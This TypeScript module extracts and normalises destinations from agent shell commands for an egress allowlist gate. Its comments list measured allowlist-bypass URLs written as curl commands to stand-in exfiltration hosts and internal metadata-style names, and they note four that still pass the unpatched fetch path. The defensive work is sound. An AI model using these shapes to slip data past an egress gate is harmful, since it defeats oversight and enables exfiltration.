/**
 * The Guardian's destination extractor: what stands between an ACS
 * `raw_command` and AGT's stock egress gate.
 *
 * NOT the gate. `policy/lib/egress.rego` is the gate, `cfg.egress` is its
 * configuration, `egress_destination_not_allowed` is the reason it emits, and
 * every one of those is AGT's, vendored byte-identical and not authored here.
 * This module supplies one of that gate's own declared inputs -- the
 * destination path `["annotations", "egress", "destination"]`, one of the five
 * that `default_destination_paths` declares, which is to say AGT anticipated
 * exactly this seam and published the address for it.
 *
 * WHY EXTRACTION RATHER THAN FORWARDING. `host_of()` has two branches, and
 * both of them answer something for a whole command line. When the string
 * contains "://" it takes everything after the scheme, so a URL bounded by a
 * "/" survives being embedded in a command: measured, `curl
 * https://evil.test/x` answers `evil.test`. That is the case that works, and
 * it is the only one. When the string contains no "://" the second branch
 * returns the command's own leading word -- measured, `echo hi` answers
 * `echo hi` and `ls -la /tmp` answers `ls -la ` -- so a forwarded command
 * line always resolves a destination, and no allowlist pattern matches a
 * command, so every benign shell step would be denied. And when nothing
 * bounds the host on the right, trailing shell text is swallowed into it:
 * `curl https://docs.anthropic.com; ls` answers `docs.anthropic.com; ls`,
 * which turns an allowlisted destination into a denial. Extracting the URL
 * first is what keeps the gate from deciding about strings that are not
 * destinations at all.
 *
 * WHY THE GATE IS HANDED AN ORIGIN RATHER THAN THE URL AS MATCHED.
 * `host_of()` takes the substring after the scheme, splits it on "/", takes
 * index 0, splits THAT on ":" and takes index 0 again. That is not a URL parse,
 * and three separate shapes get past it -- all three measured against the
 * shipped allowlist, through a Guardian started from this tree, with the URL
 * handed over as matched:
 *
 *   curl https://docs.anthropic.com:pw@exfil.attacker.test/steal   ALLOWED
 *   curl https://metadata?x=@docs.anthropic.com                    ALLOWED
 *   curl https://internal-api#@docs.anthropic.com                  ALLOWED
 *
 * The first is a userinfo carrying a ":": the split at that ":" answers
 * `docs.anthropic.com`, which `*.anthropic.com` covers. The second and third
 * need no userinfo at all -- an authority ends at the first of "/", "?" or "#",
 * `host_of()` bounds only at "/", so the query or fragment text joins the
 * "host", and the allowlist glob's "*" swallows it whenever the real host has
 * NO DOT IN IT. That last condition is what turns a parsing nit into a bypass:
 * dotless names are internal ones -- `metadata`, `internal-api` -- which is
 * exactly the class an egress gate is deployed for. `curl` reaches `metadata`
 * and `internal-api` for those two (measured with `curl -w '%{url.host}'`).
 *
 * So where this module answers a destination at all, it answers
 * `new URL(...).origin`, not the matched text. An origin is scheme, host and
 * port and nothing else: it CANNOT carry a userinfo, a query or a fragment, so
 * every shape above collapses to the host the request actually reaches, and
 * `host_of()`'s remaining job -- split the port off -- is one it does
 * correctly. Measured, all three deny.
 *
 * WHY THE PARSE ALONE IS NOT ENOUGH, AND WHY AMBIGUITY IS ANSWERED WITH A
 * DESTINATION THAT CANNOT RESOLVE. Three parsers disagree about what host a
 * command line reaches, and only one of them is the one that matters:
 *
 *   - `new URL`, which follows the WHATWG rules;
 *   - `host_of()` in `policy/lib/egress.rego`, whose two splits are neither
 *     WHATWG nor RFC 3986;
 *   - `curl`, after the shell has already rewritten the argument.
 *
 * The measured case that separates them is a backslash. WHATWG treats "\" as
 * "/" in a special scheme, so the authority ends there; `curl` does not treat
 * it as a delimiter at all, and an unquoted shell removes it before `curl` ever
 * sees it. So for `curl https://docs.anthropic.com\@evil.test/steal`, a parse
 * of the matched text answers the origin `https://docs.anthropic.com`, which
 * `*.anthropic.com` covers, while `curl` reaches `evil.test` (measured with
 * `curl -w '%{url.host}'`). That is an allowlisted answer for an off-allowlist
 * destination, and no amount of delimiter-fixing removes the class: computing
 * "the host this will reach" from a PRE-SHELL command line needs both a shell
 * parser and curl's parser, and this module has neither.
 *
 * So the default is inverted. This module decides only the shapes on which no
 * parser could disagree -- a plain host, optionally a numeric port, terminated
 * by "/", "?", "#" or the end of the token -- and answers every other shape
 * with a destination that cannot resolve, `AMBIGUOUS_DESTINATION` below. The
 * gate then denies it, because no allowlist can cover it. Narrow and total
 * beats clever and partial: a shape this module does not recognise is one it
 * refuses to vouch for, rather than one it guesses about.
 *
 * `{}` IS NOT A SAFE ANSWER TO AMBIGUITY, AND THAT IS THE LOAD-BEARING POINT.
 * With no destination the gate's `destination(rules)` resolves nothing, is
 * undefined, and the call ALLOWS. Ambiguity only denies if this module hands
 * over a string the allowlist cannot match. `{}` is kept for the cases that
 * genuinely carry no URL -- no match at all, a non-string `raw_command`, a
 * destination argument the gate already reads, an input shape this function
 * cannot read -- because those mean "this module has no opinion", which is a
 * different thing from "this module cannot tell".
 *
 * WHAT THE OPERATOR SEES. For an ambiguous input the gate's message reads
 * `destination unresolved.invalid not in allowlist [...]` -- less informative
 * than a message naming a host, and deliberately so, because naming a host
 * would mean claiming to know which one. The command that produced it is
 * unchanged in the audit envelope, so the shell text is recoverable there; this
 * comment is what an operator who greps that literal string is looking for.
 *
 * FOUR HAND-ROLLED ATTEMPTS PRECEDED THIS ONE, AND EACH LEAKED A DIFFERENT
 * SHAPE. The first handed the URL over as matched; the second stripped userinfo
 * but bounded the authority at "/" alone, which re-opened the class on
 * query-delimited and fragment-delimited authorities; the third bounded at "/",
 * "?" and "#" and still left the dotless-host shape; the fourth replaced the
 * hand-rolled strip with a real parse and leaked the backslash shape above --
 * the first of the four to answer an ALLOWLISTED host for an off-allowlist
 * destination. Each round closed the shape it was shown and met a new one,
 * because each round was still trying to compute an undecidable answer. Do not
 * add a fifth pattern for the next shape found: the shape belongs in the
 * differential corpus in `packages/guardian/test/fixtures/`, and if the
 * annotator answers an allowlisted host for it, what is wrong is the
 * unambiguous-shape test, not the missing special case.
 *
 * WHAT AN ORIGIN DROPS, AND WHY IT COSTS NOTHING HERE. The path, query and
 * fragment go. The gate consults only `host_of(dest)`, so today none of them
 * was ever read, and the message AGT emits names a host either way. The one
 * deployment this would matter to is one that pointed
 * `cfg.egress.destination_paths` at a rule expecting a whole URL at this
 * address -- a path this repository does not ship and a change that would have
 * to be made deliberately.
 *
 * TWO EFFECTS IN THE PERMISSIVE DIRECTION, BOTH MEASURED AND BOTH RECORDED
 * RATHER THAN DISCOVERED LATER. `new URL` lowercases the host, and the
 * allowlist glob is case-sensitive, so `curl https://DOCS.ANTHROPIC.COM/x`
 * denied under an earlier build of this module and allows now. That is correct
 * -- DNS is case-insensitive and the request reaches the allowlisted host
 * either way -- but it is a widening, and it is stated as one.
 * `curl https://EVIL.TEST/x` still denies, and so does
 * `curl https://docs.anthropic.com.evil.test/x`.
 *
 * ONE EFFECT IN THE RESTRICTIVE DIRECTION, ALSO MEASURED.
 * `curl https://docs.anthropic%2ecom/x` denies now. A percent-escape is not a
 * shape the unambiguous test admits, so it answers the sentinel -- yet `curl`
 * resolves that URL to `docs.anthropic.com`, which the allowlist covers. It is
 * a real over-block, and it is the direction this module chooses to fail in.
 *
 * THIS IS A CORRECTION TO THE STRING THIS MODULE CHOOSES TO SUPPLY, NOT TO THE
 * GATE, AND THE TWO ROUTES ARE NOT SYMMETRIC. The same misreadings are still
 * live on the path that does not come through here: a fetch tool's own `url`
 * argument is the gate's FIRST declared destination path, read by `host_of()`
 * directly with nothing in between. Measured against the shipped allowlist,
 * four URLs are ALLOWED there and denied here:
 *
 *   https://docs.anthropic.com:pw@exfil.attacker.test/steal  reaches exfil.attacker.test
 *   https://metadata?x=@docs.anthropic.com                   reaches metadata
 *   https://internal-api#@docs.anthropic.com                 reaches internal-api
 *   https://evil?x=@docs.anthropic.com                       reaches evil
 *
 * Closing those would mean editing `policy/lib/egress.rego`, which is AGT's
 * file, held byte-identical by `bun run verify:pin`. They are recorded as a
 * measured limitation instead -- see the runbook section on what this does not
 * catch. A reader who takes "two routes, one gate" to mean the two routes
 * decide alike is reading something this deployment does not claim.
 *
 * WHY IT READS THE PRELIMINARY DOCUMENT ITSELF. A manifest's
 * `annotations.<name>.from` is a liveness precondition, not a projection: the
 * SDK requires the path to resolve (an unresolvable one denies the whole call
 * on runtime_error:path_missing, before this function is called at all) and
 * then hands the dispatcher the entire preliminary policy input rather than
 * the value it resolved. Measured. So the command is read here, from the
 * snapshot, by name.
 */

/**
 * The tool-argument names AGT's own gate already reads a destination out of --
 * `default_destination_paths` in `policy/lib/egress.rego`, minus the
 * annotation path this module writes.
 *
 * When one of them is already a string on the snapshot, this module answers
 * nothing. `destination(rules)` is a COMPLETE Rego rule over every configured
 * path, so two paths resolving to different strings has no single answer:
 * measured, that is `deny runtime_error:policy_invocation_failed` -- a total
 * deny wearing a runtime-error reason, on a call nobody decided about. The
 * tool's own argument is the better evidence anyway: it is what the tool will
 * actually reach for, where a command line is what someone typed.
 *
 * The coupling is a copy, and it is only correct while the gate runs on its
 * defaults: `cfg.egress.destination_paths` replaces `default_destination_paths`
 * outright rather than extending it, so a deployment that sets that key
 * desynchronises this list in whichever direction it moved -- a path it adds is
 * one this module will not stand down for, and a path it drops is one this
 * module stands down for needlessly. The shipped `policy/lib/data.json` sets no
 * such key. A deployment that sets one has to revisit this list.
 */
const ARGUMENTS_AGT_ALREADY_READS = ["url", "endpoint", "host", "domain"] as const;

/**
 * The first absolute http(s) URL in a command line.
 *
 * Scheme-anchored on purpose. A bare-host pattern would match package names,
 * file paths and flag values, and every false positive here becomes a denial
 * of a step nobody meant to govern. The character class ends the match at
 * whitespace and at the shell metacharacters that end a word, so a trailing
 * `; ls` or `| tee` is not swallowed into the host.
 *
 * First match, not every match: the gate takes one destination. A command
 * reaching two hosts has its first examined and the rest unexamined, which is
 * this module's stated miss direction rather than a hidden one.
 */
const DESTINATION_IN_COMMAND = /\bhttps?:\/\/[^\s'"`;|&()<>]+/;

/**
 * The authority shapes on which no parser disagrees: a plain host, optionally a
 * numeric port, terminated by "/", "?", "#" or the end of the token.
 *
 * Every character admitted before that terminator is one that WHATWG,
 * `host_of()` and `curl` all read as part of the host. What is excluded is
 * where they part company: "@" (userinfo, which two of the three do not bound),
 * "\" (a delimiter to WHATWG, a host character to `curl`, and removed outright
 * by an unquoted shell), "%" (an escape WHATWG decodes inside a host and
 * `host_of()` does not), ":" followed by anything but digits (a userinfo
 * password to WHATWG, a port separator to `host_of()`), and every character
 * that is not a letter, digit, dot or hyphen.
 *
 * Anchored at the start, so it tests the whole match rather than searching
 * inside it: a match that begins unambiguously and then turns ambiguous fails.
 */
const UNAMBIGUOUS_AUTHORITY = /^https?:\/\/[A-Za-z0-9.\-]+(?::\d+)?(?:[/?#]|$)/;

/**
 * What this module answers when it cannot tell which host a command reaches.
 *
 * RFC 2606 reserves `.invalid` for exactly this: a name guaranteed never to
 * resolve, so it can never be a real destination and can never be legitimately
 * allowlisted. It is a value the gate can decide about and must deny, which is
 * the whole point -- an absent destination would make the gate undefined and
 * the call would ALLOW.
 */
const AMBIGUOUS_DESTINATION = "https://unresolved.invalid";

function isPlainObject(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

/**
 * Answers one of three things, and the difference between the second and the
 * third is the whole design:
 *
 *   - `{destination}` carrying an ORIGIN -- scheme, host and port -- when the
 *     command carries a URL whose authority no parser could read two ways;
 *   - `{destination}` carrying `AMBIGUOUS_DESTINATION` when it carries a URL
 *     this module cannot vouch for, so the gate denies rather than allows;
 *   - `{}` when it carries no URL for this module to have an opinion about, or
 *     when a destination the gate already reads is on the snapshot.
 *
 * Never a throw and never `null`, and both halves are load-bearing. AGT turns
 * any annotator failure -- thrown or rejected -- into its own
 * `runtime_error:annotation_failed` deny, which lands on EVERY call in the
 * deployment, benign ones included, and reads like a policy decision. And a
 * command with no destination is not a failure: the gate is `undefined` when
 * nothing resolves, and the call falls through to the other gates. So a shell
 * step that reaches the network in a form this regex does not match at all is
 * UNEXAMINED here, not denied -- the failure direction the runbook states
 * plainly, because the demo's shape invites the opposite reading.
 *
 * `name` and `config` are part of the dispatcher contract and are not read:
 * this function is the one annotator this Guardian has, and routing by name is
 * its caller's job.
 */
export function annotateEgressDestination(_name: string, _config: unknown, preliminary: unknown): unknown {
  if (!isPlainObject(preliminary)) return {};
  const snapshot = preliminary.snapshot;
  if (!isPlainObject(snapshot)) return {};
  const toolCall = snapshot.tool_call;
  if (!isPlainObject(toolCall)) return {};

  const args = isPlainObject(toolCall.args) ? toolCall.args : {};
  for (const argument of ARGUMENTS_AGT_ALREADY_READS) {
    if (typeof args[argument] === "string") return {};
  }

  const rawCommand = toolCall.raw_command;
  if (typeof rawCommand !== "string") return {};

  const found = DESTINATION_IN_COMMAND.exec(rawCommand);
  // No URL in the command is the one case where silence is right: nothing here
  // is a destination, so there is nothing to be ambiguous about.
  if (found === null) return {};

  // Everything past this point is a URL, and from here `{}` would be an ALLOW.
  // A shape the unambiguous test rejects gets the sentinel, not silence.
  if (!UNAMBIGUOUS_AUTHORITY.test(found[0])) return { destination: AMBIGUOUS_DESTINATION };

  // `new URL` throws on input it cannot parse, and this function may not: a
  // throw here becomes AGT's own `runtime_error:annotation_failed` deny on
  // every call in the deployment. The test above does not make the parse
  // infallible -- `https://:1` passes no part of it, but `https://a:99999999999`
  // has the shape and still throws on the port range -- so the catch answers
  // the sentinel too. It is the same judgement: a URL this module cannot
  // resolve to an origin is one it will not vouch for.
  let parsed: URL;
  try {
    parsed = new URL(found[0]);
  } catch {
    return { destination: AMBIGUOUS_DESTINATION };
  }
  return { destination: parsed.origin };
}
